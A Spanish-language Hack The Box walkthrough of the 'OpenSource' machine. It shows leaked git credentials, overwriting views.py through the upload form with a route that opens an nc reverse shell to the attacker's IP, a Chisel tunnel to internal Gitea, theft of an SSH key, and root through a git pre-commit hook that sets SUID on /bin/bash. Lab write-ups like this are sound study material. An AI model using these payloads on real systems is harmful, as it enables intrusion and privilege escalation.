# OpenSource

<p align="center"> 
<img src="images/htb.png" width="600" alt="Resultado de Nmap">
</p>

## Información General

<h3> Dificultad: <img src="https://img.shields.io/badge/Medium-orange"> </h3>

<h3> Sistema operativo: Linux</h3>

<h3> Vulnerabilidad explotada: Abusing Gitea + Information Leakage,   
Abusing Cron Job + Git Hooks [Privilege Escalation] </h3>

<h3> Fecha de resolución: 29/11/2025 </h3>

<h3>Enlace de la mv: <a href="https://app.hackthebox.com/machines/471/information" target="_blank">OpenSource</a></h3>

### **Leer el documento en Ingles** <a href="opensource_ingles.md">OpenSource</a>

## Reconocimiento

**HTB** nos proporciona la ip de la máquina objetivo **10.129.227.140**

Voy a establecer en el fichero **/etc/hosts** la **ip de la mv objetivo**, la voy a llamar **opensource**

### Ping

Dependiendo del resultado podemos deducir si es una máquina linux o window, por ejemplo:

```
ping -c 1 10.129.227.140
```

**Su ttl es 64. Por tanto, es Linux**

### Escaneo de puertos abiertos

#### Escaneo de puerto TCP

El comando que uso con nmap es:

```
sudo nmap -p- --open -sS -sC -sV --min-rate 2000 -n -vvv -Pn 10.129.227.140
```

<p align="center"> 
<img src="images/nmap.png" width="600" alt="Resultado de Nmap">
</p>

<div align="center">

| Open port | Service | Version                         |
| --------- | ------- | ------------------------------- |
| 22        | ssh     | OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 |
| 80        | http    | Werkzeug httpd 2.1.2            |

</div>

## Exploración

### Fuzzing web

```
http://10.129.227.140/
```

<p align="center"> 
<img src="images/upcloud.png" width="600" alt="Resultado de Nmap">
<img src="images/http.png" width="600" alt="Resultado de Nmap">
</p>

Realizando una investigación rápida lo que es Upcloud, es básicamente un lugar en internet donde puedes crear y usar servidores virtuales. Como por ejemplo: servidores vps para webb, apps, bbdd, donde alojas paginas web.

```
gobuster dir -u http://10.129.227.140/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x txt,py,php,sh
```

<p align="center"> 
<img src="images/gobuster.png" width="600" alt="Resultado de Nmap">
</p>

Esta url me descarga un .zip llamado **source.zip** 

Creamos una carpeta donde vamos a comprimir el .zip

```
unzip source.zip
```

<p align="center"> 
<img src="images/Pasted image 20251128221816.png" width="600" alt="Resultado de Nmap">
</p>

Como contiene un archivo oculto llamada .git eso significa que podemos usar los comandos de git, por tanto:

```
git branch
```

<p align="center"> 
<img src="images/Pasted image 20251128221949.png" width="600" alt="Resultado de Nmap">
</p>

Este comando sirve para visualizar las ramas que se presenta y en que rama nos situamos

```
git log
```

<p align="center"> 
<img src="images/Pasted image 20251128222343.png" width="600" alt="Resultado de Nmap">
</p>

Aquí visualizamos los **commit** que se ha realizado de la rama **public**
```
git log dev
```

<p align="center"> 
<img src="images/Pasted image 20251128224937.png" width="600" alt="Resultado de Nmap">
</p>

Investigando en un commit de la rama **dev** he encontrado unas creendeciales.

```
git show a76f8f75f7a4a12b706b0cf9c983796fa1985820
```

<p align="center"> 
<img src="images/Pasted image 20251128225111.png" width="600" alt="Resultado de Nmap">
</p>

**user**: dev01 <br>
**pass**: Soulless_Developer#2022

## Explotación

### Script views.py

Investigando la carpeta que se descomprimió, el archivo **views.py** es clave, el objetivo ahora es entender lo que hace este script y como usarlo a nuestro favor en mentalidad de pentesting.

<p align="center"> 
<img src="images/Pasted image 20251129002520.png" width="600" alt="Resultado de Nmap">
</p>

Este script en termino sencillo lo que hace es subir un archivo y luego, acceder a el publicamente.

La función **upload_file()** recibe un archivo desde un formulario y lo guarda en la carpeta:

```
public/uploads/
```

La función **send_report()** permite acceder a cualquier archivo en esa carpeta mediante la ruta:

```
/uploads/<nombre_del_archivo>
```

El parámetro **os.path.join()** se encarga de construir la ruta completa del archivo combinando la carpeta base y el nombre del archivo subido, asegurando que se guarde en la ubicación correcta sin importar el sistema operativo.

Por tanto la pregunta que tendríamos que hacer es, **¿Qué problema tiene este script?**

El problema principal es que el script no valida el contenido de los archivos subidos:

Aunque **get_file_name()** intenta prevenir ataques como **path traversal,** no hay control sobre el tipo de archivo ni su contenido.

<p align="center"> 
<img src="images/Pasted image 20251129004014.png" width="600" alt="Resultado de Nmap">
</p>

Esto significa que un atacante podría subir archivo peligroso (como es mi caso) con el objetivo de conseguir reverse shell.

<p align="center"> 
<img src="images/Pasted image 20251129005640.png" width="600" alt="Resultado de Nmap">
</p>

```
@app.route('/shell')
def cmd():
    return os.system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.144 4443 >/tmp/f")
```

Añadimos esto al script **reviews.py** al final. Esto los que nos da es la shell interactiva que queremos, obtenemos el comando entre parentesis de **os.system** en esta <a href="https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet " target="_blank">página</a>


<p align="center"> 
<img src="images/Pasted image 20251129005946.png" width="600" alt="Resultado de Nmap">
</p>

Ahora bien, la idea es subir este archivo editado **reviews.py** a la pagina de la maquina victima y sobrescribir el archivo **reviews.py** por el nuestro editado. 

Antes de subirlo, tenemos que interceptarlo con burpsuite

<p align="center"> 
<img src="images/Pasted image 20251129011831.png" width="600" alt="Resultado de Nmap">
<img src="images/Pasted image 20251129011934.png" width="600" alt="Resultado de Nmap">
</p>

En **filename** nos aparecerá solamente "views.py" lo cambiamos a "/app/app/views.py" y luego le damos a  **Forward** y desactivamos la intercepción para efectuar el cambio.

<p align="center"> 
<img src="images/Pasted image 20251129011754.png" width="600" alt="Resultado de Nmap">
</p>

Una vez que la subida haya sido exitosa, preparamos los siguientes comandos:

El puerto de escucha:

```
nc -lvnp 4443 
```

El comando para llamar a la shell es:

```
curl http://10.129.227.140/shell
```

<p align="center"> 
<img src="images/Pasted image 20251129012442.png" width="600" alt="Resultado de Nmap">
</p>

**Dato importante** Hemos accedido al contenedor no a la máquina objetivo. 

```
ip a
```

<p align="center"> 
<img src="images/Pasted image 20251129012615.png" width="600" alt="Resultado de Nmap">
</p>

La ip del contenedor es 172.17.0.2 y la de nuestra maquina victima es 10.129.227.140 pero hay una forma de referirnos a la maquina victima desde el contenedor y eso ocurre porque Docker crea una red virtual interna donde el host actúa como router. Su interfaz docker0 tiene la IP 172.17.0.1, por eso desde cualquier contenedor esa dirección siempre apunta al host.

### TTY

```
python -c "import pty;pty.spawn('/bin/sh')"
control z
stty raw -echo; fg 
reset xterm
export TERM=xterm
export SHELL=bash
stty rows 44 columns 184
```

### Ping

Una vez conseguido una conexión más estable haremos el siguiente comando para saber si tenemos conexión con la maquina victima

``` 
ping -c 1 172.17.0.1
```

<p align="center"> 
<img src="images/Pasted image 20251129015849.png" width="600" alt="Resultado de Nmap">
</p>

El paquete se transmitido por tanto, si tenemos conexión

### Nmap hecho a mano

Nos vamos a fabricar mano un nmap para saber que puerto están abierto en nuestra maquina victima.

```
for port in $(seq 1 10000); do nc 172.17.0.1 $port -zv; done
```

<p align="center"> 
<img src="images/Pasted image 20251129020444.png" width="600" alt="Resultado de Nmap">
</p>

Este comando imita a nmap realizando un escaneo de puerto usando netcat. Sirve para saber que puertos tenemos abierto en 172.17.0.1

En nuestro primer escaneo nmap solo realizamos un escaneo a puertos abierto, y no a puertos filtrado... por tanto si intentamos realizar nuevamente este scaneo

```
sudo nmap -p- -sS -sC -sV --min-rate 2000 -n -vvv -Pn 10.129.227.140
```

<p align="center"> 
<img src="images/Pasted image 20251129021342.png" width="600" alt="Resultado de Nmap">
</p>

Nos encontramos el puerto 3000 pero esta abierto desde la maquina victima.

Si realizamos lo siguiente visualizamos el contenido del puerto 3000

```
curl http://10.129.227.140/shell
```

<p align="center"> 
<img src="images/Pasted image 20251129021721.png" width="600" alt="Resultado de Nmap">
</p>

**¿Que es Gitea?**

Gitea es un sitio web para guardar y gestionar proyectos con Git, parecido a GitHub o GitLab, pero es más pequeño, es muy ligero y cualquiera puede instalarlo en su propio servidor

### Chisel

Por tanto usaremos nuestra herramienta chisel para traernos este puertos a nuestra maquina atacante. https://github.com/jpillora/chisel/releases/tag/v1.11.3

<p align="center"> 
<img src="images/Pasted image 20251129023903.png" width="600" alt="Resultado de Nmap">
</p>

Le cambiamos de nombre y lo descomprimos

```
mv chisel_1.11.3_linux_amd64.gz chisel.gz
gunzip chisel.gz
chmod +x chisel
```

Además le vamos a reducir el tamaño, el tamaño actual es

```
du -hc chisel
```

<p align="center"> 
<img src="images/Pasted image 20251129024557.png" width="600" alt="Resultado de Nmap">
</p>

```
upx chisel
du -hc chisel
```

<p align="center"> 
<img src="images/Pasted image 20251129024639.png" width="600" alt="Resultado de Nmap">
</p>

Luego enviamos este archivo a nuestra maquina victima mediante el siguiente comando y lo descargamos:

```
python3 -m http.server
```

En la **maquina atacante** preparamos el servidor de chisel

```
./chisel server --reverse -p 1234
```

<p align="center"> 
<img src="images/Pasted image 20251129024725.png" width="600" alt="Resultado de Nmap">
</p>

En el contenedor preparamos el cliente de chisel

```
./chisel client 10.10.14.144:1234 R:3000:172.17.0.1:3000
```

<p align="center"> 
<img src="images/Pasted image 20251129025104.png" width="600" alt="Resultado de Nmap">
</p>

En nuestra maquina atacante observaremos que se ha conectado

<p align="center"> 
<img src="images/Pasted image 20251129025148.png" width="600" alt="Resultado de Nmap">
</p>

En la maquina atacante obtenemos el puerto 3000 de la maquina victima.

```
http://localhost:3000/
```

<p align="center"> 
<img src="images/Pasted image 20251129025427.png" width="600" alt="Resultado de Nmap">
</p>

Ahora con las credenciales que obtuvimos anteriormente, nos logueamos, luego accedemos al siguiente url para obtener **id_rsa**

```
http://localhost:3000/dev01/home-backup/src/branch/main/.ssh/id_rsa
```

<p align="center"> 
<img src="images/Pasted image 20251129030240.png" width="600" alt="Resultado de Nmap">
</p>

En nuestra maquina atacante creamos un archivo **id_rsa** y copiamos el **id_rsa** que hemos conseguido de gitea. Le damos el siguiente permiso 

```
sudo chmod +600 id_rsa
ssh -i id_rsa dev01@10.129.227.140
```

<p align="center"> 
<img src="images/Pasted image 20251129030437.png" width="600" alt="Resultado de Nmap">
</p>

Obtenemos el flag del user

```
cat user.txt
```

<p align="center"> 
<img src="images/Pasted image 20251129030714.png" width="600" alt="Resultado de Nmap">
</p>

## Escalada de Privilegios

```
find / -perm -4000 2>/dev/null
```

<p align="center"> 
<img src="images/Pasted image 20251129031047.png" width="600" alt="Resultado de Nmap">
</p>

**No encuentro nada**

Investigando descubro una herramienta que se usa bastante en la escalada de privilegio que se llama **pspy** que básicamente se usa para monitorizar procesos y comandos en sistemas Linux sin necesidad de privilegios root 

En la pagina de descarga <a href="https://github.com/DominicBreuker/pspy?tab=readme-ov-file" target="_blank">pspy</a> aparece 4 versiones

<p align="center"> 
<img src="images/Pasted image 20251129131349.png" width="600" alt="Resultado de Nmap">
</p>

Realizando el comando

```
uname -a
```

**Linux opensource 4.15.0-176-generic #185-Ubuntu SMP Tue Mar 29 17:40:04 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux**

• x86_64 → 64 bits	
• i386/i686 → 32 bits

Por tanto usaremos el 64 bit big

Usaremos este comando que nos lista procesos y comandos ejecutados, si tiene UID=0 significa que lo hace root

```
./pspy64 -pf -i 1000
```

<p align="center"> 
<img src="images/Pasted image 20251129130012.png" width="600" alt="Resultado de Nmap">
</p>

<a href="https://gtfobins.github.io" target="_blank">gtfobins</a> buscamos en el navegador **git**, y resulta que se puede explotar una vulnerabilidad que consiste básicamente en subir un commit pero que no verifica su contenido, por tanto en ese commit, puedo ejecutar un comando que me eleve los privilegios del usuarios **chmod u+s** y como ademas lo lleva acabo root es cuestion de tiempo en conseguir esa elevación de privilegios

<p align="center"> 
<img src="images/Pasted image 20251129032316.png" width="600" alt="Resultado de Nmap">
</p>

```
echo 'exec /bin/sh 0<&2 1>&2' >"$TF/.git/hooks/pre-commit.sample"
```

Esto es lo que extraemos de gtfobins pero tenemos que hacerle una modificación

```
echo 'chmod u+s /bin/bash' > "/home/dev01/.git/hooks/pre-commit"
chmod +x /home/dev01/.git/hooks/pre-commit
ls -l /bin/bash
```

<p align="center"> 
<img src="images/Pasted image 20251129033445.png" width="600" alt="Resultado de Nmap">
</p>

Esperamos unos segundos para que se efectué el cambio, es decir, en teoría, esto tendria que cambiar de permiso y darnos root

```
ls -l /bin/bash
```

<p align="center"> 
<img src="images/Pasted image 20251129033536.png" width="600" alt="Resultado de Nmap">
</p>

```
bash -p
```

<p align="center"> 
<img src="images/Pasted image 20251129033625.png" width="600" alt="Resultado de Nmap">
</p>

Obtenemos la flag de root

<p align="center"> 
<img src="images/Pasted image 20251129033658.png" width="600" alt="Resultado de Nmap">
</p>

## Conclusión

Durante el análisis de la máquina _OpenSource_ de Hack The Box, me encontré con un flujo de explotación distinto al habitual, lo cual me permitió reforzar mi capacidad de investigación y comprensión de procesos internos.

El punto de partida fue la aplicación web expuesta por la máquina. Investigándola a fondo, descubrí la posibilidad de descargar un archivo relacionado con Docker. A partir de este recurso, como directorios `.git`, obtuve información relevante del proyecto, incluyendo credenciales pertenecientes al usuario **dev01**.

Durante la revisión del código fuente, identifiqué un comportamiento inseguro en el script `views.py`, encargado de gestionar subidas de archivos. Este componente no verificaba adecuadamente el contenido enviado a la plataforma, lo que evidenciaba una superficie de ataque clara: la posibilidad de subir un archivo manipulado para ejecutar acciones no previstas por el sistema.

Una vez dentro del contenedor, observé que este formaba parte de la red interna de la máquina víctima. Aprovechando esto, mapeé los servicios accesibles y descubrí que el puerto **3000** estaba disponible solo desde la red interna que daba lugar a una plataforma llamada **gitea**. Utilicé un túnel realizado con _Chisel_ para reenviarme dicho puerto a mi máquina de atacante. Al acceder al servicio interno y emplear las credenciales recopiladas previamente, obtuve acceso a información adicional, incluyendo la clave privada `id_rsa` de un usuario del sistema.

Dado que el puerto **22** estaba abierto externamente, utilicé esa clave para acceder al sistema principal con dicho usuario.

Para avanzar hacia la escalada de privilegios, utilicé la herramienta **pspy**, que permite observar procesos ejecutados automáticamente en el sistema. Esta fase fue clave: gracias a pspy identifiqué que **root** ejecutaba periódicamente `/usr/local/bin/git-sync`. Al investigar el comportamiento del sistema, comprobé que los commits utilizados en este flujo no tenían verificación por firmas, lo cual puede generar escenarios en los que contenido no validado es sincronizado automáticamente.

Ese descubrimiento me permitió comprender cómo un flujo de sincronización automatizado, mal configurado, puede convertirse en un punto crítico de seguridad si no se verifican las fuentes, ni el contenido, ni se aplican mecanismos como firmas GPG, controles de integridad o sistemas de despliegue aislados.

En definitiva, reforzó la mentalidad analítica necesaria en el ámbito del pentesting: observar, correlacionar, cuestionar cómo y por qué se ejecutan las cosas, y detectar dónde un mal diseño puede convertirse en una vulnerabilidad.